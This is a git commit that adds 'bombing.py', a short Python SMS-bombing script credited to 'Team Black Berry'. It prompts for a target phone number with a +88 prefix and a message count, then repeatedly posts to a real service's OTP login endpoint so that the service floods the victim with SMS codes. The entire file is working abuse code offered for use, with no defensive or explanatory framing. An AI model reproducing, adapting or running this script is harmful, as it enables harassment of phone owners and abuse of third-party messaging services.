44461bf89ad6702b1ecc021d0163b961f2d71e48
AshisTBB <102225487+AshisTBB@users.noreply.github.com>
2022-03-23 17:17:51 +0600

    Create bombing.py

---
+++ bombing.py
@@ -0,0 +1,29 @@
+import requests
+from requests.structures import CaseInsensitiveDict
+print("\033[H\033[J")
+print("""
+                    T_B_B
+         TÊÃM BLÅÇK BËRRY
+         Created by: ÅSB ÃSHÏS BÎSWÅS
+                    TBB C_O
+  
+  
+  
+  Creator: Asb Ashis Biswas
+  Facebook : https://www.facebook.com/profile.php?id=100074238783251
+  CO: Team Black Berry
+  
+  """)                                                        
+number=str(input("Enter Terget Number:+88 "))
+amount=int(input("Enter Terget Amount: "))
+url = "https://ss.binge.buzz/otp/send/login"
+
+headers = CaseInsensitiveDict()
+headers["Content-Type"] = "application/x-www-form-urlencoded"
+
+data = "phone="+number
+
+
+for j in range(amount):
+    resp = requests.post(url, headers=headers, data=data)
+    print(str(j+1)+"TBB SMS SENT")
